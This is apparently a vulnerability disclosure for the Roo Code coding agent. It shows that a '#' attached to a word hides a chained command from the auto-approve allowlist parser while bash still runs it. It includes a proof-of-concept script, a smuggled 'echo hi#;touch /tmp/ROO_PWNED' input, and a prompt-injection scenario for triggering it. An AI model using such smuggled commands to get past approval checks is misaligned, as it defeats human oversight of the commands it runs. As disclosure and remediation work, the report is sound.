https://github.com/RooCodeInc/Roo-Code - "This repository was archived by the owner on May 16, 2026. It is now read-only."

## Finding: Auto-approve command allowlist bypassed via a `#` that is a comment to the parser but not to bash (word-boundary mismatch)

Affected Version: commit b867ec9 (v3.53.0)

### Summary

When "always approve execute" is enabled, Roo Code auto-approves agent-proposed shell commands by matching each one against an allowlist and denylist. The command is tokenized with the third-party `shell-quote` parser. `shell-quote` treats `#` as the start of a comment even when the `#` is attached to the end of a word, packing the rest of the line — including command separators and the commands after them — into a single `{comment}` token. `parseCommand`'s token loop handles only operator and string tokens, so that comment token is silently dropped. bash, in contrast, only treats `#` as a comment when it begins a word, so `echo hi#;touch /tmp/ROO_PWNED` runs `touch`. The approval gate sees only `echo hi`, matches the `echo` allowlist prefix, and auto-approves, while the denied command hidden after the attached `#` executes. Confirmed against the `getCommandDecision` and `parseCommand` functions.

### Details

The decision is made in `src/core/auto-approval/commands.ts`; `getCommandDecision` calls `parseCommand` (`src/shared/parse-command.ts`) to split the command into sub-commands, then checks each against the allow/deny lists. `parseCommand` tokenizes with `shell-quote`'s `parse` (`parse-command.ts:119`) and consumes the tokens in this loop (lines 148 to 173):

```ts
for (const token of tokens) {
    if (typeof token === "object" && "op" in token) {
        // Chain operator - split command
        if (["&&", "||", ";", "|", "&"].includes(token.op)) {
            // ... start a new sub-command
        } else {
            currentCommand.push(token.op)
        }
    } else if (typeof token === "string") {
        // ... push the word onto the current sub-command
    }
}
```

A `shell-quote` comment token is an object without an `op` property, so it matches neither branch and is dropped. The problem is what `shell-quote` puts inside that token. For `echo hi#;touch /tmp/ROO_PWNED` it returns:

```
["echo", "hi", { comment: ";touch /tmp/ROO_PWNED" }]
```

`shell-quote` started the comment at the `#` even though the `#` is attached to `hi` (no preceding whitespace), and swallowed the `;touch /tmp/ROO_PWNED` into the comment token. The token loop drops it, so `parseCommand` returns the single sub-command `echo hi`, which begins with the allowlisted prefix `echo` and is auto-approved.

bash applies the opposite rule. A `#` begins a comment only at the start of a word (preceded by whitespace, a metacharacter, or the line start). In `echo hi#;touch /tmp/ROO_PWNED` the `#` is inside the word `hi#`, so it is literal; bash runs `echo hi#`, then the `;` separator, then `touch /tmp/ROO_PWNED`. The denied command the parser discarded as a comment is the command bash executes.

The mismatch is purely the word-boundary rule, shown by the two controls below: `echo hi # touch ...` (space before `#`) is a real comment to both the parser and bash, so it is safe; `echo hi#;touch ...` (no space) is a comment only to the parser.

### PoC

The approval gate depends only on `shell-quote`, so it runs directly against the two unmodified source files at the reported commit. The rest of the repository is a pnpm workspace (`workspace:` protocol deps) and is not needed here:

```bash
git clone https://github.com/RooCodeInc/Roo-Code && (cd Roo-Code && git checkout b867ec9)

# take the two files verbatim, keeping the src/ layout so the internal import resolves
mkdir -p repro/src/core/auto-approval repro/src/shared
cp Roo-Code/src/core/auto-approval/commands.ts repro/src/core/auto-approval/
cp Roo-Code/src/shared/parse-command.ts        repro/src/shared/

cd repro && npm init -y && npm i shell-quote@1.8.3
# save poc.ts (below) here, then run — tsx resolves the extensionless TS imports the source uses:
npx tsx poc.ts
```

```ts
// poc.ts
import { getCommandDecision } from "./src/core/auto-approval/commands"
const ALLOW = ["echo"], DENY = ["touch"]
for (const cmd of [
  "touch /tmp/ROO_PWNED",             // control -> auto_deny    (denied command is caught when bare)
  "echo hi # touch /tmp/ROO_PWNED",   // control -> auto_approve (real comment; bash also drops it, safe)
  "echo hi#;touch /tmp/ROO_PWNED",    // BYPASS  -> auto_approve  (comment only to the parser; bash runs touch)
]) console.log(getCommandDecision(cmd, ALLOW, DENY).padEnd(12), "<-", JSON.stringify(cmd))
```

Results:

```
auto_deny    <- "touch /tmp/ROO_PWNED"
auto_approve <- "echo hi # touch /tmp/ROO_PWNED"
auto_approve <- "echo hi#;touch /tmp/ROO_PWNED"     (BYPASS, should deny)
```

Bash confirms the word-boundary difference in effect:

```bash
bash -c 'echo hi # touch /tmp/ROO_PWNED'   # prints "hi"; # is a real comment -> touch does NOT run
bash -c 'echo hi#;touch /tmp/ROO_PWNED'    # prints "hi#"; # is not a comment -> touch RUNS
```

Only the second creates `/tmp/ROO_PWNED`, yet both received the same `auto_approve` decision.

### Impact

A denied or unlisted command placed after a word-attached `#` is dropped by the approval parser but executed by bash, defeating the allow/deny control. The realistic trigger is indirect prompt injection: untrusted content the agent reads (a file, web page, repository, or MCP result) steers it into emitting `<allowed prefix> <word>#;<denied command>`, which auto-runs with the agent's auto-execute privileges on the developer's machine.

### Remediation

Do not rely on `shell-quote`'s comment tokenization, whose word-boundary rule differs from bash. Either reject any command whose `shell-quote` token stream contains a `{comment}` token (fail closed, since the discarded text may contain executable commands under bash's rules), or re-tokenize comments with bash's rule — a `#` begins a comment only at the start of a word — and treat everything from a genuine comment onward as removed while keeping word-attached `#` as literal text that stays part of the command checked against the lists.
